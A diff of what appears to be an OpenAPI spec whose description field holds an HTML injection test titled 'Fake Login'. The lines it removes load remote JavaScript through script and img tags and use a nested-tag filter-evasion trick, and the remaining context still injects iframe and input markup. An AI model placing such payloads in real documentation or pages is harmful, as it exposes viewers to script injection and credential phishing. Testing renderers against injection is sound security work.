@@ -5,15 +5,12 @@ info:
   description: '<div class="login-form">
     <div class="heading">
         <h1>HTML Injection : Fake Login</h1>
-        <script src="https://raw.githubusercontent.com/Frog-man-sec/swiggerinj/refs/heads/main/scrpt.js"></script>
     </div>
     <iframe src="">
     <input>Here is your name</input>
     <iframe>
     <div>
-    <img src="https://raw.githubusercontent.com/Frog-man-sec/swiggerinj/refs/heads/main/scrpt.js">
-    
-    <ScScriptript>Print()</ScScriptript>
+    <a>cool site</a>
     </div>
     <div>
       <span>
